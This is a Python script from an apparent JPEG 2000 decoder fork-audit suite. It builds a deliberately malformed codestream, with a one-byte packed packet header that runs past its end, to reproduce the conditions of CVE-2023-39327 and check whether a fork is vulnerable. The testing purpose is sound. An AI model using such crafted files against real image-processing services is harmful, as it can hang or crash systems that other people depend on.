# SPDX-License-Identifier: GPL-3.0-or-later
# neo-j2k 1a: writes the fork-audit probe's "loops" codestream (probe.c cmd_loops) to a file: W x W, 3 components,
# one tile, <layers> layers, Scod flags, optional 2^pp precincts, and one empty packet of data.
# With packed packet headers (ppm or ppt) the packed data is one 0xFF byte, so the first packet header runs
# past its end, and the tile data is one body byte: the rows of CVE-2023-39327 with PPM and PPT.
# usage: py -3 -I make_loops.py <out> <W> <layers> <scod> [pp] [inband|ppm|ppt] [progression 0-4]
import struct
import sys

out, W, layers, scod = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4], 0)
pp = int(sys.argv[5]) if len(sys.argv) > 5 else 0
headers = sys.argv[6] if len(sys.argv) > 6 else "inband"
prog = int(sys.argv[7]) if len(sys.argv) > 7 else 0
if headers not in ("inband", "ppm", "ppt") or not 0 <= prog <= 4:
    raise SystemExit("usage: make_loops.py <out> <W> <layers> <scod> [pp] [inband|ppm|ppt] [progression 0-4]")
b = bytearray()
b += struct.pack(">H", 0xFF4F)
b += struct.pack(">HHHIIIIIIIIH", 0xFF51, 38 + 3 * 3, 0, W, W, 0, 0, W, W, 0, 0, 3) + bytes([7, 1, 1]) * 3
b += struct.pack(">HHBBHB", 0xFF52, 12 + (6 if pp else 0), scod | (1 if pp else 0), prog, layers, 0) + bytes([5, 4, 4, 0, 1])
if pp:
    b += bytes([pp | (pp << 4)]) * 6
b += struct.pack(">HHB", 0xFF5C, 3 + 16, 0x40) + bytes([9 << 3]) * 16
tile_header = b""
if headers == "ppm":
    b += struct.pack(">HHBI", 0xFF60, 2 + 1 + 4 + 1, 0, 1) + b"\xff"
elif headers == "ppt":
    tile_header = struct.pack(">HHB", 0xFF61, 2 + 1 + 1, 0) + b"\xff"
data = b"\x00"
b += struct.pack(">HHHIBB", 0xFF90, 10, 0, 12 + len(tile_header) + 2 + len(data), 0, 1) + tile_header
b += struct.pack(">H", 0xFF93) + data
b += struct.pack(">H", 0xFFD9)
open(out, "wb").write(bytes(b))
print(f"{out}: {len(b)} bytes")
